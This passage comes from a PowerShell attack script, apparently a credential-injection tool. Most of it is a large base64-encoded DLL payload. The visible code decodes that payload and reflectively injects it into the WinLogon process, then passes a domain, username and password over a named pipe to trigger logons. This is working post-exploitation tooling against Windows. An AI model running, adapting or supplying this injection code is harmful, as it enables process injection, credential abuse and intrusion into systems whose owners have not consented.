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ZgAAoE0BAERmAAB8ZgAAoE0BAHxmAADqZgAABFEBAOxmAAANZwAAQE0BACBnAABZZwAAoE0BAFxnAAAdaAAAkFABACBoAADUbAAAdFABANRsAAA5bwAA7FABADxvAAATcAAAJFEBADhwAADucAAAqFABAPBwAADtcgAAWFEBAPByAADzdAAA7E8BAPR0AABHdQAAKFMBAEh1AADadgAAOFABANx2AAAAeQAAQFEBAAB5AAAeegAA1FABACB6AABHegAAKFMBAEh6AABxegAAQE0BAIB6AAC7egAAoE0BAMR6AABNewAAtFIBAFB7AABwewAAqFEBAHB7AACPewAAiFEBAJB7AACtewAAKFMBALB7AADNewAAKFMBANB7AAAzfAAAQE0BADR8AACVfAAAQE0BAKB8AADkfAAAoE0BAOR8AABrfQAAtFIBAGx9AAAnfgAAyFEBACh+AACHfgAAfE8BAPB+AAA9fwAA8FEBAHB/AACpfwAAoE0BAOR/AAAIggAAFFIBAAiCAAAwggAAKFMBADCCAACtggAAdEwBALCCAAA+gwAAtFIBAECDAAAhhQAAyFIBACSFAADehQAAQFIBAOCFAAA8iAAAZFIBADyIAADqigAAlFIBAOyKAAC/iwAAfE8BAMCLAABajAAAoE0BAHCMAACUjAAA6FIBAKCMAAC4jAAA8FIBAMCMAADBjAAA9FIBANCMAADRjAAA+FIBANSMAABZjQAAQE0BAFyNAADHjQAAQE0BAOSNAACwjgAAQE0BALCOAADwjgAAKFMBAPCOAABekQAA/FIBAGCRAADqkQAA1FABAOyRAAAekgAAKFMBACCSAACvkgAAGFMBAAiTAACgkwAAoE0BAKCTAADQkwAAKFMBANiTAAA9lAAAQE0BAECUAABxlAAAQE0BAOSUAAAKlQAAKFMBAAyVAABrlQAAKFMBAGyVAABLlgAAMFMBAEyWAACInQAAXFMBAIidAABrngAAgFMBAGyeAAD/ngAAfE8BAACfAABTnwAAQE0BAFSfAACJqQAArFMBAIypAADSqQAAQE0BANSpAAAlqgAA0FMBACiqAAC8qgAA5FMBAEirAADerAAAtFIBAIStAAD5rQAA/FMBAPytAABergAAoE0BAGCuAACjrgAAdEwBAKSuAADprgAAdEwBAASvAACOsAAAHFQBAJCwAACk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qPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrADgAACUAAAAQKZIplCmWKZgpmimcKZ4poCmiKaQppimoKaoprCmuKbApsim0KbYpuCm6KbwpvimAKcIpxCnGKcgpyinMKdIp1CnWKdgp2incKd4p4CniKeQp5iniKiQqJiouKjAqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKoA8AAAGAAAAHiogKiIqJCoqKiwqLiowKgAAAEAcAEAAMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwAQAQAIAgAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AIAEA9AAAAAigGKAooDigSKBYoGigeKCIoJigqKC4oMig2KDooPigCKEYoSihOKGgrKissKy4rMCsyKzQrNis4KzorPCs+KwArQitEK0YrSCtKK0wrTitQK1IrVCtWK1grWitcK14rYCtiK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivAEABAAwAAADopQAAAHABAIAAAAAAoCigUKB4oKCg0KAQoRihAKNwpXilgKWIpZClmKWgpailsKW4pcinAKsQq9Cu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AgAEAvAAAAACgCKAQoBigIKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoPigAKEIoRChGKEgoSihMKE4oUChSKFQoVihYKFooXCheKGAoYihkKHYofihGKI4oliikKKoorCiuKLAogijEKMYoyCjKKMwozijQKNIo1CjWKNoo3CjeKOAo4ijkKOYo6CjqKOwo8Cj0KMIpECkcKSopLCkuKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
        [Byte[]]$Logon32Bit = [Convert]::FromBase64String($Logon32Bit_Base64)
        [Byte[]]$Logon64Bit = [Convert]::FromBase64String($Logon64Bit_Base64)
        Invoke-ReflectivePEInjection -Bytes32 $Logon32Bit -Bytes64 $Logon64Bit -ProcId $WinLogonProcessId


        #Send domain, username, and password over the named pipe
        [Byte[]]$DomainBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($DomainName)
        [Byte[]]$UsernameBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($UserName)
        [Byte[]]$PasswordBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($Password)

        $Pipe.WaitForConnection()

        $Pipe.Write($DomainBytes, 0, $DomainBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent domain"
        $Pipe.Write($UsernameBytes, 0, $UsernameBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent username"
        $Pipe.Write($PasswordBytes, 0, $PasswordBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent password"
        $Pipe.WriteByte($LogonTypeNum)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent logontype"
        $Pipe.WriteByte($AuthPackageNum)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent auth package"

        $RetMessageSize = 1024
        [Byte[]]$ReturnMessageBytes = New-Object Byte[] $RetMessageSize
        $ReadBytes = $Pipe.Read($ReturnMessageBytes, 0, $RetMessageSize)

        $ReturnMessage = [System.Text.ASCIIEncoding]::ASCII.GetString($ReturnMessageBytes, 0, $ReadBytes)
        Write-Output "DLL OUTPUT: $($ReturnMessage)"
    }
    finally
    {
        $Pipe.Dispose()
    }
}
